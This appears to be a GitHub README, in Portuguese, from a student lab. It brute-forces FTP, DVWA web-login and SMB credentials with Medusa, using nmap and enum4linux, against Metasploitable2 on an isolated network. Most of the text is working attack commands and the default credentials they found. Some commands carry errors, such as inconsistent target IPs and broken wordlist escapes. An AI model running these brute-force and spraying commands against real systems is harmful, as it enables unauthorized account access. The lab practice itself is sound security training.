# project-bruteforce
Lab - Medusa em Kali + Metasploitable

2 VMs no VirtualBox: Kali Linux (atacante) e Metasploitable2/DVWA (alvo)

Rede: Host-only / internal (isolada)
I
P do alvo usado: 192.168.56.101

1#

ping  -c 3 192.168.56.101
<img width="848" height="259" alt="image" src="https://github.com/user-attachments/assets/f388b4cb-1afd-4f6c-b4fe-b3ae2dcb1e40" />

mmap -sV -p 21,22,80,445,139 192.168.56.101
<img width="886" height="311" alt="image" src="https://github.com/user-attachments/assets/a50ec576-1a00-4ea7-9c3c-3869b95adaa0" />

echo -e ‘user\nmsfadmin\nadmin\root’ > users.txt

echo -e ‘123456\npassword\nqwerty\nmsfadmin’ > pass.txt

medusa -h 192.168.56.102 -U users.txt -P pass.txt -M ftp -t 6
<img width="886" height="258" alt="image" src="https://github.com/user-attachments/assets/36c266d6-0d23-4d74-bf00-64273869af3d" />
<img width="520" height="306" alt="image" src="https://github.com/user-attachments/assets/488dc721-da3f-4925-a59b-cdb499485c96" />

2#

http://192.168.56.101/dvwa/login.php
<img width="886" height="489" alt="image" src="https://github.com/user-attachments/assets/e2ba728b-2f44-4795-826a-b6f2e8ac8926" />
<img width="886" height="287" alt="image" src="https://github.com/user-attachments/assets/2b6ecc0c-3da6-4480-9d12-583c678cb0aa" />

echo -e ‘123456\password\nqwerty\nmsfadmin’ > pass.txt

echo -e ‘user\npassword\nqwerty\nmsfadmin/admin’ > users.txt

medusa -h 192.168.56.102 -U users.txt -P pass.txt -M http \
-m PAGE: ’/dvwa/login.php’ \
-m FORM: ’username=^USER^&password=^PASS^&Login=Login’ \
-m ‘FAIL=Login failed’ -t 6

2025-10-26 13:41::02 ACCOUNT FOUND [http] Host: 192.168.56.101 User: admin Password: password [SUCESS]
<img width="816" height="555" alt="image" src="https://github.com/user-attachments/assets/e7b2d565-3bc1-4acc-a26e-e40ce7bc59d8" />
<img width="886" height="509" alt="image" src="https://github.com/user-attachments/assets/eaa0cec5-0b4a-45c9-92d8-1d73633c62e4" />

3#

enum4linux -a 192.168.56.101 | tee enum4_output.txt

less enum4_output.txt 

<img width="522" height="723" alt="image" src="https://github.com/user-attachments/assets/16a88aac-67dc-42e0-a815-3ad178e3fb20" />

echo -e ‘password\n123456\nWelcome\nmsfadmin’ > senhas_spray.tx

echo -e ‘user\nmsfadmin\nservice’ > smb_users.txt

medusa -h 192.168.56.101 -U smb_users.txt -P senhas_spray.txt  -M smbnt -t 2 -T 50

2025-10-26 13:58:11 ACCOUNT FOUND [smbnt] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCESS (ADMIN$ - Acess Allowed)]

smbclient -L //192.168.56.101 -U msfadmin
<img width="886" height="398" alt="image" src="https://github.com/user-attachments/assets/b683300d-b205-42b7-8199-4d0b24744153" />









